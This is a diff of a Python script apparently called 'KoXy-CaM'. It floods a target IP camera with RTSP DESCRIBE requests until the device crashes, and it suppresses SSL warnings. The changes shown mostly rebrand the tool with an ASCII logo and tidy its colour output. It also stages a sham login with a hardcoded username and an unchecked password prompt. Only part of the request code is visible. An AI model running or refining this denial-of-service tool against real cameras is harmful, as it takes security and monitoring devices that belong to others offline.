@@ -1,6 +1,6 @@
 import os
 import sys
-import getpass  # For securely inputting the password
+import getpass
 import requests
 from colorama import Fore, Style
 from halo import Halo
@@ -11,14 +11,17 @@ threads = 8
 # Suppress SSL warnings
 requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
-# Color codes
-USERNAME_COLOR = Fore.GREEN + Style.BRIGHT
-PASSWORD_COLOR = Fore.GREEN + Style.BRIGHT
+# ASCII art for "KoXy-CaM"
+logo_art = '''
+██╗░░██╗░█████╗░██╗░░██╗██╗░░░██╗░░░░░░░█████╗░░█████╗░███╗░░░███╗
+██║░██╔╝██╔══██╗╚██╗██╔╝╚██╗░██╔╝░░░░░░██╔══██╗██╔══██╗████╗░████║
+█████═╝░██║░░██║░╚███╔╝░░╚████╔╝░█████╗██║░░╚═╝███████║██╔████╔██║
+██╔═██╗░██║░░██║░██╔██╗░░░╚██╔╝░░╚════╝██║░░██╗██╔══██║██║╚██╔╝██║
+██║░╚██╗╚█████╔╝██╔╝╚██╗░░░██║░░░░░░░░░╚█████╔╝██║░░██║██║░╚═╝░██║
+╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░░░░░░░░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝
+'''
 
-# HACK: See https://stackoverflow.com/questions/3572397/lib-curl-in-c-disable-printing
-def do_not_write(b, _):
-    return len(b)
-
+# Function to perform the RTSP Describe
 def rtsp_describe(target, count, username, password):
     try:
         response = requests.request(
@@ -39,6 +42,7 @@ def rtsp_describe(target, count, username, password):
         print(f"{Fore.GREEN}✓ After {count} tries, the camera seems to have crashed.{Style.RESET_ALL}")
         sys.exit(0)
 
+# Main function
 def main():
     red = Fore.RED + Style.BRIGHT
 
@@ -49,11 +53,11 @@ def main():
 
     target = args[0]
     username = "koxy"  # Hardcoded username
-    password = getpass.getpass(prompt=f"{PASSWORD_COLOR}Enter password: {Style.RESET_ALL}")
+    password = getpass.getpass(prompt=f"{Style.BRIGHT}{Fore.GREEN}Enter password: {Style.RESET_ALL}")
 
     # Displaying username and hidden password
-    print(f"{USERNAME_COLOR}Username: {username} {Style.RESET_ALL}")
-    print(f"{PASSWORD_COLOR}Password: {'*' * len(password)} {Style.RESET_ALL}")
+    print(f"{Style.BRIGHT}{Fore.GREEN}Username: {username} {Style.RESET_ALL}")
+    print(f"{Style.BRIGHT}{Fore.GREEN}Password: {'*' * len(password)} {Style.RESET_ALL}")
 
     # Simulating login success
     print(f"{Fore.GREEN}Login Success{Style.RESET_ALL}")
@@ -84,4 +88,6 @@ def main():
     print("to send requests to the camera quickly enough.")
 
 if __name__ == "__main__":
+    print(logo_art)
     main()
+
